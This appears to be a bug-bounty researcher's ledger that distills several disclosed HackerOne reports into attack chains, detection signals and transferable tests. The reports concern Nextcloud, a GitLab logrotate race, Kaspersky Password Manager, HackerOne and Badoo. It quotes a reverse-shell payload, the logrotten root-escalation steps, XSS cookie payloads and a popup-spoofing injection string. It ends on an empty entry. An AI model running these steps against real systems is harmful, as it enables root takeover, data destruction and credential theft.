SOURCE: https://hackerone.com/reports/508493  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/508493.json` — HTTP 200, `visibility: full`, `vulnerability_information` 594 B read IN FULL (FIRST route worked — no fallbacks needed). Metadata: Nextcloud, "Group admins can remove arbitrary data from "data" directory (including admin data)", weakness Privilege Escalation, severity high, reporter `leonklingele`, created 2019-03-12, disclosed 2019-08-12, state Closed/Resolved, asset `nextcloud/server` (SOURCE_CODE, max_severity critical).
STATUS: UNVERIFIED (not reproduced — source-code/self-hosted target; no Nextcloud instance stood up and no request sent to any target this pass)
CLASS: privilege escalation (vertical) / arbitrary data deletion via RESERVED-NAME COLLISION on the user lifecycle — a low-privilege group admin creates a user whose UID collides with a system directory name under the shared data root, then deletes the user; the lifecycle deletion removes `data/<uid>` recursively, destroying admin/instance data
CORE METHOD:
  1. THE PRIMITIVE (report, verbatim): "Create a new user and make him an admin of an arbitrary group / Log in as this new user / Create a new user "files_external", "appdata_{random-data}", .. / Delete this user" — a group admin (not a server admin) is enough, and the created UID is chosen by the attacker.
  2. THE EFFECT (report, verbatim): "Result: The data/files_external / data/appdata{..} folder is removed." — the delete of the USER takes the SYSTEM directory of the same name with it.
  3. THE ROOT CAUSE (report's own solution, verbatim): "Prevent creation of users if data/{new-user-uid} is either a file or a folder. In addition, prevent deletion of users where the user data directory (data/{user}) contains other files and folders than "files" (where the user data is stored)." — two missing checks: CREATE does not reject a UID whose name ALREADY EXISTS as a file or folder under the data root, and DELETE recurses into `data/<uid>` without verifying the subtree contains only the owner's own `files` dir.
  4. THE IMPACT (report title + impact, verbatim): "Group admins can remove arbitrary data from "data" directory (including admin data)" / "Group admin can remove arbitrary data from "data" directory".
DETECTION SIGNAL: a per-user/tenant storage tree keyed by a caller-supplied identifier (uid, username, tenant slug) under a shared root where reserved system entries (`appdata_*`, `files_external`, cache/tmp/trash/preview dirs) sit in the SAME namespace as user dirs; a create path that accepts any identifier without checking it against existing names in the root; a delete path that removes the keyed dir recursively with no ownership-subtree check. Tell: creating an object whose key equals an existing system dir/file name SUCCEEDS.
CHAIN: group admin holding only group-admin rights over "an arbitrary group" plus user create/delete (precondition: low-privilege role, no server-admin) -> create a user with UID = a reserved system directory name (`files_external`, `appdata_<random>`) — the name collides with a system dir under `data/` (primitive: no reserved/existing-name validation at CREATE) -> delete that user -> the lifecycle deletion removes `data/<uid>` recursively (escalation: the delete is keyed to the NAME, and the name IS the system dir) -> "remove arbitrary data from "data" directory (including admin data)" (terminal: integrity destruction of admin/instance-wide shared data; program rated High).
TRANSFERABLE TEST: on any app where per-user/tenant storage dirs are keyed by a caller-supplied identifier: (1) list the storage root's non-user entries (`appdata_*`, `files_external`, cache, tmp, previews); (2) create a user/tenant/object whose key equals one of them — and in a second run, an existing FILE name; (3) delete it and check whether the system entry vanished; (4) conversely, plant a foreign file inside your own storage dir and delete your account — does the delete nuke the foreign file too? Rule: **`delete(data/<key>)` is only safe if `<key>` was validated against reserved/existing names at CREATE and the subtree is verified owner-only at DELETE — test both sides.**
DEDUPE/DELTA: NEW GENERAL METHOD -> §17.732. Tokens `508493|leonklingele|files_external|appdata_|reserved` across the three write targets immediately before append: 0 technique hits. Recorded neighbours REVIEWED and NOT conflated: the `.git` worktree-name collision entry (bugbountyhuntingskills.md 6985-6994 — same DISCIPLINE "validate caller-supplied names against reserved names", but the mechanism is config-sink code exec (`core.fsmonitor`) and the terminal is RCE inside a sandbox, not lifecycle deletion); the Nextcloud `files_external` storage-config write-IDOR (ledger 15283, `PUT /apps/files_external/userstorages/<id>`) — same surface family, a config write-IDOR, not directory deletion; the `AppData` hits are Windows path-traversal material, unrelated.
FRESHNESS: created 2019-03-12, disclosed 2019-08-12 — OUTSIDE the preferred 6-12 month window (~7 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (no Nextcloud instance stood up; no request sent to any target). Every quote above is verbatim from the live `.json` `vulnerability_information` read IN FULL this pass (594 B).

SOURCE: https://hackerone.com/reports/578119  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/578119.json` — HTTP 200, `visibility: full`, `vulnerability_information` 11,149 B read IN FULL (FIRST route worked — no fallbacks needed). Metadata: GitLab, "Privilege escalation due to insecure use of logrotate", weakness Privilege Escalation, severity low (team), reporter `petee`, created 2019-05-12, disclosed 2019-10-01, state Closed/Resolved, asset `gitlab.com` (URL).
STATUS: UNVERIFIED (not reproduced — needs a Linux host to win the rotation race; the report's own reliability preconditions are not available here)
CLASS: privilege escalation — local system user -> ROOT via a LOGROTATE SYMLINK RACE: the service's log directory is writable by the service user while root-run logrotate rotates `*.log` inside it and creates the rotated file with root privileges (chowning it back to the service user); the attacker race-renames the log subdirectory and symlinks it to a root-executed directory, then writes a payload into the root-created file they now own
CORE METHOD:
  1. THE SINK (report, verbatim): "Gitlab sets the ownership of the logdirectory to the system-user "git", which might let local users obtain root access because of unsafe interaction with logrotate." Logdir perms (report): `drwxr-xr-x 19 git root 4096 ... /var/log/gitlab/`; the logrotate blocks rotate `/var/log/gitlab/gitlab-workhorse/*.log` (hourly, `compress`, `copytruncate`, `missingok`) with NO `su` directive — so rotation runs as root and the created rotated file (`something.log.1.gz`) is chowned to `git`.
  2. THE RACE (report, verbatim): "Due to logrotate is prone to a race-condition it is possible for user "git" to replace the directory /var/log/gitlab/gitlab-workhorse/ with a symbolik link to any directory(for example /etc/bash_completion.d). Logrotate will place files AS ROOT into /etc/bash_completition.d and set the owner of the file to "git"."
  3. THE POC (report's steps, condensed, all quotes verbatim): `sudo -u git /bin/bash` -> `git clone https://github.com/whotwagner/logrotten.git /tmp/logrotten && gcc -o logrotten logrotten.c` -> `echo "hello gitlab" > /var/log/gitlab/gitlab-workhorse/something.log` -> `./logrotten -c /var/log/gitlab/gitlab-workhorse/something.log` ("Renamed /var/log/gitlab/gitlab-workhorse with /var/log/gitlab/gitlab-workhorse2 and created symlink to /etc/bash_completion.d") -> the rotated file lands in the symlinked dir owned by `git`, overwrite it with a payload such as a root-gated reverse shell (`if [ id -u -eq 0 ]; then nc -e /bin/bash localhost 3333; fi` — the report's exact line backticks `id -u`) and catch the root shell on next root login (report transcript: "connect to [127.0.0.1] ... uid=0(root)"). The report's own escalation note: "It might be possible to exploit this bug without interaction of user root by writing into /etc/cron.d or anything similar."
  4. RELIABILITY PRECONDITIONS (report, verbatim): "filesystem on bare disk. don't use lvm2 or overlayfs / don't use containers / stop auditd / stop tuned / don't use selinux or apparmor".
  5. MITIGATION (report, verbatim): "Change the owner and group of /var/log/gitlab to root or use the "su"-directive in the logrotate configuration file."
DETECTION SIGNAL: any root-run logrotate block rotating `*.log` under a directory WRITABLE BY A NON-ROOT user, with no `su` directive and create/compress semantics that let logrotate create + chown the rotated file; log trees owned `service-user:root` (e.g. `drwxr-xr-x git root /var/log/gitlab`); rotation frequency = the race window. Tell: `ls -ld` on every rotated log's parent — anything not `root:root` is suspect.
CHAIN: code execution as the unprivileged service user (precondition: any low-priv shell or file-write foothold on the host — shared hosting, self-hosted product, CI runner) -> the service user can WRITE its log directory (primitive: log dir owned by the service user) -> win the logrotate race: rename the log subdir, symlink it to a root-executed directory (`/etc/cron.d`, `/etc/bash_completion.d`) (bypass: logrotate resolves the path at rotation time, runs as root, no `su`) -> logrotate creates the rotated file AS ROOT in the attacker-chosen directory and chowns it to the service user -> attacker writes a cron/completion payload into the file they now own -> root command execution (terminal: full host root — the doctrine §4 ladder "low-priv foothold -> root").
TRANSFERABLE TEST: on ANY host where you hold a low-priv shell (shared hosting, self-hosted product, CI runner, container with a mounted host log dir): (1) read `/etc/logrotate.d/*` and flag every block whose path parent is writable by you (`find /var/log -maxdepth 2 -writable -type d`) and lacks `su`; (2) run the logrotten race shape against it: create `<anything>.log`, race-rename the containing dir and symlink it to `/etc/cron.d` (non-interactive root trigger) or `/etc/bash_completion.d`; (3) when the rotated file appears in the target dir owned by your user, write the payload and wait for rotation / root login. Rule: **root-run rotation over a user-writable directory is an arbitrary root file write — the rotated filename is attacker-created, the destination directory is attacker-chosen, and the created file is chowned back to the attacker.**
DEDUPE/DELTA: NEW GENERAL METHOD -> §17.733. Tokens `578119|logrotten|bash_completion` across the three write targets immediately before append: 0 hits; `logrotate`'s only hits are the Apache scoreboard-SHM LPE entries (bugbountyhuntingskills.md 8809/8816; Bugbountyskills.md 22958-22959) where logrotate is merely the SCHEDULED TRIGGER of `apache2ctl graceful` — a different primitive (SHM index corruption before setuid), REVIEWED and NOT conflated. Nearest local-privesc neighbours: the setuid-$PATH helper-resolution LPE (#426944, §17.86) — different mechanism (exec resolution, not a file-write race).
FRESHNESS: created 2019-05-12, disclosed 2019-10-01 — OUTSIDE the preferred 6-12 month window (~7 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (no GitLab host stood up, no race attempted, no request sent to any target). Every quote above is verbatim from the live `.json` `vulnerability_information` read IN FULL this pass (11,149 B).

Per-source disposition, in assigned order: (1) #858255 (Nextcloud, "Cross site scripting - XSRF Token", reporter `a9hora`, created 2020-04-24, disclosed 2020-06-14, severity medium, weakness XSS-Generic, asset `nextcloud.com` URL) — VALID but NOT APPENDED (CHAIN-ONLY rule + self-side terminal): the method, verbatim, is "Open URL: https://nextcloud.com/enterprise/buy/ / Fill up valid name and email address and put payload in other fields. Payload/s: `<img src="x" onload=alert(document.cookie);>` `<svg/onload=alert(document.cookie);>` / Submit it / Open email address you mentioned in the email field / Open up the email source / You will be prompted with xsrf-token" with impact verbatim "As an attacker is getting the xsrf-token, he can utilize it in later attack such as, CSRF." The repro has the ATTACKER read the confirmation email at THEIR OWN address (step 4: "Open email address you mentioned in the email field"), so the XSRF token in the email source is the SUBMITTER'S OWN — the report never establishes a victim-side token, and the terminal ("later attack such as CSRF") is speculative, not a documented chain; per the chain-only rule an email-embedded-token/HTML-email-reflection finding is admissible only as the first link of a documented chain reaching concrete impact. Its atoms are the RECORDED email-template-XSS carrier family (ledger 9125 / Bugbountyskills 23238/8496 detection signals; #294505 Shopify contact-customer form declined in batch 277 on the same composition+non-demonstrated-terminal grounds). Residue kept so no later pass re-opens #858255: enterprise/buy lead form fields -> outbound confirmation email rendered as HTML (email-context XSS), email HTML SOURCE embeds an `xsrf` token; the probe "open the SOURCE of every email you trigger and diff it for embedded secrets + unencoded reflection" is a habit worth keeping but is not an entry (no demonstrated chain; self-side recipient). (2) #825646 (Staging.every.org, "Improper email address verifiation while saving Account Details", reporter `harshitshah4`, created 2020-03-20, disclosed 2020-03-23, severity medium, weakness Violation of Secure Design Principles, asset `staging.every.org`) — VALID but NOT APPENDED (EXACT-FAMILY DUPLICATE of the recorded email-change-without-verification class): the method, verbatim, is "Singup with any email address / Go to profile section / Click on update button / Monitor call in reverse proxy and change email field to any user's email address / Done! Attacker is able to change its email address to any email address even registered one's" ("Even though UI doesnot allow it"; supporting reference = H1 #30975; impact "Attacker might be able to impersonate as any other user"). The class "change the account email to another user's email without verification -> impersonation/ATO" is recorded at Reddit #1551176 ("Able to bypass email verification and change email to any other user email" — mass-assigned `email`, auto-verified), §12.1 ("XSS -> email change -> ATO (the standard escalation)"), Stripe #1250037 (email-change IDOR -> ATO, held as pointer, "the class is ALREADY in this ledger"), and the "UI does not allow it, the request does" rule is ledger ~5198 ("UI hiding is not enforcement"). The only delta is the collision flavour (accepting an ALREADY-REGISTERED email = uniqueness bypass) via a plain field edit in the standard update call — simpler carrier, same class. Residue: staging.every.org profile-update call, `email` field set to a registered foreign address via proxy intercept; uniqueness bypass variant. (3) #508493 -> ENTRY + NEW GENERAL METHOD §17.732 (block above). (4) #578119 -> ENTRY + NEW GENERAL METHOD §17.733 (block above). (5) #538008 (BuddyPress Core, "Add users to groups who have restricted group invites", reporter `yuvraj_dighe`, created 2019-04-14, disclosed 2019-07-27, severity high (team), weakness Improper Access Control - Generic, asset BuddyPress Core SOURCE_CODE; WordPress 5.2 + BuddyPress 4.2.0) — VALID but NOT APPENDED (spam/harassment terminal + recorded family): the method, verbatim, is "From account of user A, enable the setting `I want to restrict Group invites to my friends only.` ... From account of user B, make a POST request to: `POST : http://bbwordpress.esy.es/wp-admin/admin-ajax.php` `BODY : message=&nonce=21f500cbfd&group_id=1&action=groups_send_group_invites&_wpnonce=7264177f51&users%5B%5D=3` ... Replace the value of users with the victims user id" — the action endpoint never re-evaluates the RECIPIENT's privacy setting, so the victim "would receive an invitation ... even though the privacy setting to restrict group invites has been enabled". The demonstrated terminal is ONE unwanted invite (spam/harassment — doctrine §2(d) excludes it standalone; the pixiv #3100570 "Bypassing Inbox Privacy Settings and Enabling Spam" decline at bugbountyhuntingskills.md 13448-13453 applies on identical grounds: "a spam/harassment impact that doctrine §2(d) excludes standalone"), and the general rule "a privacy setting enforced in one flow but not re-checked at the action endpoint" is the RECORDED family (ledger 3519/3527 TikTok — "a privacy setting that the web path honours but the auth/duplication path does not"; WakaTime #3003716; ledger ~21162 framing). No chain documented (nothing beyond the invite). Residue: `admin-ajax.php` `action=groups_send_group_invites`, `users[]=<victim_id>`, attacker-session nonces; BuddyPress "friends only" invite restriction = UI-flow check only. (6) #441161 (Smule, "Missing Rate Limit in Forgot Password can Lead to email address leakage of all smule accounts", reporter `dhakal_ananda`, created 2018-11-15, disclosed 2019-05-13, severity medium, weakness Improper Restriction of Authentication Attempts, asset `*.smule.com` WILDCARD) — VALID but NOT APPENDED (stock corpus + doctrine §2(c)): the method, verbatim, is "Enter your email address and for the forgot password parameter / Capture the request in the proxy / Brute for the parameter using different email address / Check the different request and see the response. The right email and the wrong email will have different response and request length." The technique (user/email enumeration via response-length delta on forgot-password) is STOCK and already recorded at ledger 632 ("**No rate limit** → credential stuffing; enumerate users first via response-length/timing delta") and the existence-oracle family (ledger 5205/3519); "most rate-limiting issues" are doctrine §2(c) core-ineligible standalone, and the report documents no ATO chain (its own impact is "email address leakage ... The confidential data of the Smule application can be leaked" — enumeration, not account compromise). Residue: forgot-password response/request-length diff for registered vs unregistered emails = email enumeration oracle; missing throttle on the same endpoint. NEW: 2 entries (sources 3, 4), 2 §17 slots (§17.732, §17.733). Doctrine framing: entry 1 lands in §1 class privilege escalation / arbitrary data destruction (demonstrated terminal = "Group admin can remove arbitrary data from "data" directory (including admin data)"; preconditions = a group-admin role with user create/delete; program rated High). SOURCE: https://hackerone.com/reports/435618  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/435618.json` — HTTP 200, `visibility: full`, `vulnerability_information` 2,916 B read IN FULL (FIRST route worked — no fallbacks needed). Metadata: Kaspersky Password Manager, "Kaspersky Password Manager is vulnerable to HTML injection in the browser action pop-up via user name", weakness Cross-site Scripting (XSS) - Stored, reporter `palant`, created 2018-11-07, disclosed 2018-12-24, state Closed/Resolved, asset Kaspersky Password Manager 9.0.1.447 / Windows 10 1803 / Firefox 62 + Chrome 70.
STATUS: UNVERIFIED (not reproduced — no Kaspersky Password Manager extension installed or driven this pass; every request shape and quote below is verbatim from the report body)
CLASS: stored HTML injection in a PRIVILEGED EXTENSION UI (CSP-bounded stored XSS) -> TRUSTED-UI SPOOFING -> CREDENTIAL THEFT — the password-manager extension's own browser-action popup renders saved user names unescaped; CSP blocks script execution but permits an external stylesheet and an iframe, which is enough to replace the popup with a pixel-perfect fake master-password prompt and capture the master secret (CWE-79 + CWE-1021/UI redress in a trusted surface)
CORE METHOD:
  1. THE SINK (report, verbatim): "There is a stored XSS vulnerability in popover.html (the page being displayed as browser action pop-up in the Kaspersky Password Manager browser extension) via user names. While exploitation is complicated due to Content Security Policy, this isn't harmless either." — the extension's own privileged popup page renders the saved credential's user name without escaping.
  2. THE DELIVERY TRICK (report steps 4-6, verbatim in substance): a hostile login page (`tricky_login.html`) submits a user name whose HTML payload "follows after a number of spaces so that it is cut off in the display here" — the save-credential dialog shows the truncated name ("Note that the dialog shows exactly the user name you entered - while the webpage manipulated it to add HTML code at the end"), so the user unknowingly saves the poisoned entry; the site then nudges the victim ("KPM icons on the input fields also claim an issue and ask you to use the toolbar button - these icons have been manipulated by the website") to open the toolbar popup.
  3. THE BYPASS (report, verbatim): "Content Security Policy prevents arbitrary script execution here. What can still be done is injecting HTML code. For my proof of concept I chose to inject an external stylesheet and an iframe tag. The result is a perfectly spoofed master password prompt, for the user this is impossible to distinguish from the real thing." — no script is needed: the stylesheet + iframe pair repaints the popup as a fake master-password prompt, and the framed attacker page receives the typed secret (the PoC ends, verbatim: "You will see an alert message saying: 'Gotcha! Your password is: ...'").
  4. THE IMPACT (report, verbatim): "this still allows websites to spoof trusted KPM user interface and trick users into entering their passwords. At the very least, websites could inject tracking images to monitor KPM usage."
DETECTION SIGNAL: a password manager / browser extension / AV / banking plugin whose OWN privileged UI page (`chrome-extension://`, `moz-extension://`, extension popup/options) renders user-supplied text (user names, entry names, notes) unescaped; a CSP on that page that blocks scripts but leaves `style-src`/`frame-src` able to reach external hosts; a truncating display (save dialog shows a clipped name) that hides a payload padded after spaces. Tell: a `<link>`/`<iframe>`/`<img>` saved as a user name LOADS in the popup.
CHAIN: hostile website supplies the login form the user saves a credential from (primitive: the website controls the user-name string) -> the name carries HTML after padding spaces, invisible in the truncating save dialog (primitive: stored HTML injection into the extension's privileged popup) -> CSP blocks script but not external stylesheet + iframe (bypass: HTML-only payload set — one `<link>` + one `<iframe>`) -> the popup repaints as a flawless fake master-password prompt (escalation: trusted-UI spoof, "impossible to distinguish from the real thing") -> the victim types the master password into the framed attacker page (terminal: theft of the password-manager MASTER secret = whole-vault takeover; secondary terminal: injected tracking images monitor KPM usage). Per doctrine §8: preconditions = victim has the extension installed/unlocked and saves a credential from an attacker page, then opens the poisoned toolbar popup; gain = the master password (and every stored secret after it).
TRANSFERABLE TEST: for every password manager / extension / AV / banking-plugin UI that renders saved user-controlled fields: (1) save an entry whose NAME/USERNAME is 50+ spaces followed by `</span><link rel=stylesheet href=https://<collab>/x.css><iframe src=https://<collab>/x.html>`; (2) confirm in the save dialog that the display truncation hides the payload; (3) open the extension's popup/options and check for stylesheet/iframe loads (OAST hit = parsed); (4) read the page's CSP — if `script-src` blocks but `style-src`/`frame-src` permit external hosts, build the spoofed prompt with exactly that pair and measure the human-visible fidelity; (5) check what the host page can do to nudge the user toward the poisoned UI (field icons, "issue" warnings). Rule: **CSP does not neutralize HTML injection in a TRUSTED UI — if stylesheets and frames load, the trusted prompt is fakeable, and the trusted prompt is where users type their master secret.**
DEDUPE/DELTA: tokens `435618`, `tricky_login`, `popover.html`, `Kaspersky Password Manager` = 0 technique hits across the three write targets (`popover` hits = the HTML popover/interest-invoker keylogger material and unrelated UI strings). Recorded neighbours REVIEWED and NOT conflated: the two OTHER `palant` Kaspersky entries already in this ledger — #469372 (ledger 10678+, first-party cert-warning interstitial with PREDICTABLE override links, `kis_cup_<GUID>_<link_id>`) and #463915 (ledger 10713+, URL-Advisor widget served first-party + unvalidated `postMessage` -> UXSS) — different primitives (predictable action links / postMessage sink), neither is stored HTML injection in the extension's own popup; §17.672 (fake prompt via CLI escape-sequence repaint — terminal surface); the §17.228 CSS-sanitizer keylogger's full-screen spoofed-login terminal (Outlook message-content CSS carrier). NEW: the CSP-bounded HTML-injection -> trusted-UI-spoof -> master-password-theft chain in a privileged extension page. New general method -> §17.734.
FRESHNESS: created 2018-11-07, disclosed 2018-12-24 — OUTSIDE the preferred 6-12 month window (~8 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (no KPM installed, no request sent to any target). Every quote above is verbatim from the live `.json` `vulnerability_information` read IN FULL this pass (2,916 B).

SOURCE: https://hackerone.com/reports/449680  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/449680.json` — HTTP 200, `visibility: full`, `vulnerability_information` 1,520 B read IN FULL (FIRST route worked — no fallbacks needed). Metadata: HackerOne (own platform), "Attacker can claim credentials for private program that has a published external program", weakness Information Disclosure, reporter `jobert`, created 2018-11-26, disclosed 2018-11-29, state Closed/Resolved. The body is the platform's own failing REGRESSION SPEC (a diff) plus an impact paragraph — the mechanics are quoted from that spec.
STATUS: UNVERIFIED (not reproduced — no GraphQL request sent to hackerone.com or any target this pass)
CLASS: broken access control / CROSS-TIER AUTHORIZATION CONFUSION on a shared resource pool — a claim/ownership-transfer mutation is authorized at the TEAM/EXTERNAL-PROGRAM tier instead of the PRIVATE-PROGRAM membership tier, so a user with no access to the private program can claim (and drain) its credential pool (CWE-863)
CORE METHOD:
  1. THE PRIMITIVE (report's regression spec, verbatim): the failing test is `spec/integration/graphql/mutations/claim_credential_mutation_spec.rb` — `describe Mutations::ClaimCredentialMutation` with `context 'external program'` -> `let!(:external_program) { create :external_program, team: team }` -> `context 'that runs a private program'` -> `let(:team) { create :team, :soft_launched }` -> `context 'user does not have access to private program'` -> `it 'does not claim the credential' do expect { subject }.not_to change { credential.reload.user } end` — i.e. ONE team runs a published external program AND a private program (`soft_launched`), the credential pool hangs off that team/private program, and the claim mutation TRANSFERS ownership (`credential.reload.user` from `nil` to `current_user`) even for a user who does not have access to the private program. The companion spec (verbatim) shows the intended happy path: `it { expect { subject }.to change { credential.reload.user }.from(nil).to(current_user) }`.
  2. THE AUTHORIZATION GAP (read from the spec's structure): the claim is gated on the wrong object — the published external program / team context — and never checks membership in the private program that OWNS the credential; the external-program pairing is the enabler ("that has a published external program" is the report title's own qualifier).
  3. THE IMPACT (report, verbatim): "An attacker can drain the pool of credentials and obtain new credentials, even when they don't have access to the program. This may leak sensitive information."
DETECTION SIGNAL: a platform object model where one TEAM/ORG spans MULTIPLE visibility tiers (published external program + private program; or public workspace + hidden tenant) sharing a resource pool (credentials, invites, seats, licenses); claim/assign/accept mutations that resolve the pool through the team/public surface instead of the OWNING tier; black-box tell: a claim call succeeds and the pool object's owner field changes although the caller has no access to the owning tier. (White-box tell in this report: the missing regression spec above — the platform wrote the failing test itself.)
CHAIN: any authenticated user with access to the published external program (precondition: low-privilege account, NO private-program access) -> the private program's pool holds environment credentials created for authorized researchers (primitive: a credential pool shared behind a mixed-visibility team) -> call `ClaimCredentialMutation` (GraphQL `POST /graphql`) against the private program's pool item (primitive: ownership transfer with no owning-tier check) -> `credential.reload.user` becomes the attacker and the pool drains ("An attacker can drain the pool of credentials and obtain new credentials, even when they don't have access to the program") -> possession of the private program's environment credentials (terminal per report: "This may leak sensitive information" — program credentials grant access to the private program's testing environment, i.e. the admin/internal-panel class; bounded at the report's own words, not inflated).
TRANSFERABLE TEST: on any multi-tier platform (one org/team combining public + private/hidden sub-programs, or SaaS org with public team + private workspace sharing a pool): (1) enumerate every operation that TRANSFERS ownership or grants access from a pool (claim, assign, accept-invite, attach, redeem, provision); (2) as a user holding access ONLY to the public tier, invoke each against pool items of the private tier (ids via GraphQL node ids or enumeration); (3) read back the object's owner field (like `credential.reload.user`) — a change means the check ran at team/public tier, not at the OWNING tier; (4) repeat after any fix: the check must be membership in the tier that OWNS the item. Rule: **a shared pool is only as private as its claim check — authorize against the tier that OWNS the resource, not the tier the caller arrived through.**
DEDUPE/DELTA: tokens `449680`, `ClaimCredential`, `claim_credential`, `credential.reload` = 0 hits across the three write targets. Recorded neighbours REVIEWED and NOT conflated: ledger 4771/4773 (report-creation counter oracle enumerating EXISTENCE of private/external programs — a recon oracle, not ownership transfer); ledger 5467/5503 (GraphQL Team fields leaking private-program state — read oracles); the Gateway mutation IDOR (ledger 10697+, `teams_i_can_see` + `skip_authorization` — same platform family, but a service-STATE write resolved via a too-broad visibility scope, not a pool-item claim across tiers); §17.486 (ACL ordering: feature-trial flag before role check — a policy-order bug, not a tier-resolution bug). NEW: the cross-tier claim check on a shared resource pool (authorization at team/public tier instead of owning private tier) with the credential-pool drain terminal. New general method -> §17.735.
FRESHNESS: created 2018-11-26, disclosed 2018-11-29 — OUTSIDE the preferred 6-12 month window (~8 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (no GraphQL request sent to any target). Every quote above is verbatim from the live `.json` `vulnerability_information` read IN FULL this pass (1,520 B — the regression-spec diff + impact). The claim call's full request wire shape is not in the body and is NOT invented; only the mutation name (`Mutations::ClaimCredentialMutation`), the ownership-transfer semantics and the authorization context are quoted from the spec.

SOURCE: https://hackerone.com/reports/402410  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/402410.json` — HTTP 200, `visibility: full`, `vulnerability_information` 5,735 B read IN FULL (FIRST route worked — no fallbacks needed). Metadata: Bumble program (report page team; the reproduction host in the body is badoo.com — same corporate family), title "Расшифровка всех типов шифрованных ID" ("Decrypting all types of encrypted IDs"), weakness Information Disclosure, reporter `jarvis0x1`, created 2018-08-29, disclosed 2018-11-01, state Closed/Resolved. Body is in Russian; quotes below are verbatim with glosses.
STATUS: UNVERIFIED (not reproduced — no request sent to badoo.com or any target this pass)
CLASS: sensitive information disclosure with PoC / DE-ANONYMIZATION — OPAQUE (encrypted) USER IDs ARE A SERIALIZATION CHOICE: a caller-set response-mode parameter on the list endpoint switches the same response between encrypted and PLAINTEXT internal IDs, and an ingest action bridges any opaque ID to its plaintext form (breaks invisible-mode privacy)
CORE METHOD:
  1. THE ORACLE (report stage 2, verbatim in substance): `POST /bmaapi.phtml?SERVER_GET_USER_LIST` with `X-Message-type: 245`, body `{"version":1,"message_type":245,"message_id":18,"body":[{"message_type":245,"server_get_user_list":{"folder_id":33,"source":174,"user_field_filter":{"projection":[200,340,1254,1250,1259]},"section_requests":[{"section_id":"4"},{"section_type":25}]}}],"is_background":false}` returns ENCRYPTED person IDs; the modified request (report, verbatim note): "Разница в folder_id: + 33 - запрос для получения шифрованных данных + 34 - запрос для получения расшифрованных данных" (the difference is `folder_id`: 33 requests encrypted data, 34 requests DECRYPTED data) — same endpoint, `folder_id:34`, `"user_field_filter":{"projection":[200]}`, and the same objects come back as plaintext numeric IDs.
  2. THE BRIDGE (report stages 1 and 3): `POST /bmaapi.phtml?SERVER_SECTION_USER_ACTION` (`X-Message-type: 259`) with `"server_section_user_action":{"action":5,"folder_id":34,...,"user_list":[{"person_id":["obff5b362880e6595302863c158018b1a7168112b2b249887"]}]}` accepts the target's ENCRYPTED id (add-to-following) — "В person_id нужно поместить шифрованный ID пользователя, который нужно извлечь" (put the encrypted ID of the user to extract in person_id); the delete (`action:1`, `folder_id:34`) then accepts the PLAINTEXT id (`"person_id":["606393962"]` — "В person_id можно уже помещать расшифрованные ID"). One action surface consuming BOTH forms proves the mapping.
  3. THE DEMONSTRATED TERMINALS (report, verbatim examples): short encrypted IDs -> numeric accounts across "Знакомства" (Dating), Live Stream, Ban list and likes (`obff5b362880e65959be3a61f779da9cf3ceb7ea826ad08ec` -> `613502044`); LONGER invisible-mode IDs de-anonymize invisible visitors (verbatim: "Благодаря этой баге я могу так же определить всех невидимок, которые меня посещают" — thanks to this bug I can identify all invisible-mode users who visit me; `o929ea7096bc8bad42b2869a8c4c435274150f98113c81f4cd39fcfc305609bfe` -> `615633337`), and verbatim: "Извлечь такую информацию нельзя даже купив премиум аккаунт. Это очень серьезный information disclose" (this information cannot be extracted even by buying a premium account — a very serious information disclosure).
DETECTION SIGNAL: an API that serializes the SAME objects two ways depending on a caller-set view/filter/mode parameter (folder/view/type/mode ids) — one mode opaque/encrypted/hashed IDs, another plaintext internal IDs; list calls carrying a `projection`/field-id array (response shaping under caller control); an action endpoint accepting BOTH the opaque and the plaintext form of an identifier. Tell: diff the ID fields of the same call across candidate mode values, byte-for-byte.
CHAIN: the list endpoint has two response modes selected by `folder_id` (primitive: caller-controlled response serialization) -> mode 34 returns PLAINTEXT internal numeric IDs where 33 returns encrypted ones (primitive: internal-representation leak — the opaque-ID scheme is view-layer only) -> the follow action ingests the target's ENCRYPTED id into a list the attacker controls (bridge: opaque -> owned list) -> re-fetch via `folder_id:34` -> the target's plaintext numeric id (impact 1: ANY encrypted ID decryptable — e.g. likes/ban-list/Dating surfaces; impact 2: invisible-mode visitors de-anonymized — the exact privacy the product sells as unobtainable even to premium, "нельзя даже купив премиум аккаунт") -> the action surface accepts the plaintext numeric id directly (escalation lead: numeric person_ids key the rest of the API — the de-obfuscated ID is the handle for IDOR probes on `person_id` endpoints).
TRANSFERABLE TEST: on any app returning opaque/encrypted/hashed object IDs: (1) collect every request-shaping parameter on list/search calls (folder/view/type/mode ids, `projection`/field-id arrays) and diff the response's ID fields across candidate values — any mode that returns the PLAINTEXT internal id breaks the obfuscation; (2) if no mode leaks directly, find an INGEST action accepting the opaque form (add/follow/tag/save) and a read that returns plaintext — bridge opaque->internal through the ingested list, then clean up; (3) verify against privacy-protected subjects (invisible/hidden mode, deleted/banned users) — the protected class is the real prize; (4) record which endpoints accept the plaintext id and pivot the de-obfuscated handle into object-reference tests. Rule: **opaque identifiers are a serialization choice, not access control — hunt the response mode and the ingest bridge that together map opaque to internal, and re-test exactly the users the product promised were hidden.**
DEDUPE/DELTA: tokens `402410`, `badoo`, `folder_id`, `obff5b`, `user_field_filter`, `SERVER_GET_USER_LIST` = 0 hits across the three write targets. Recorded neighbours REVIEWED and NOT conflated: ledger 12856-12917 (`fields=` response-PROJECTION injection — the caller NAMES a field it should not see; a field-NAME injection) and ledger 19308 (OData `$select` on a shared-key SIBLING entity escaping a per-entity denylist); §17.364 (LinkedIn visibility flag — server-side render check); the §17.697 render-only visibility toggle (search matches hidden fields — a render/search mismatch, not an ID-encoding toggle). This entry's mechanism is a MODE-TOGGLE serialization leak (same call, two `folder_id` values, two identifier encodings) plus an INGEST BRIDGE (opaque->internal via an action that accepts both forms) — no recorded neighbour holds either atom. New general method -> §17.736.

SOURCE: https://hackerone.com/reports/378148  2026-11-13
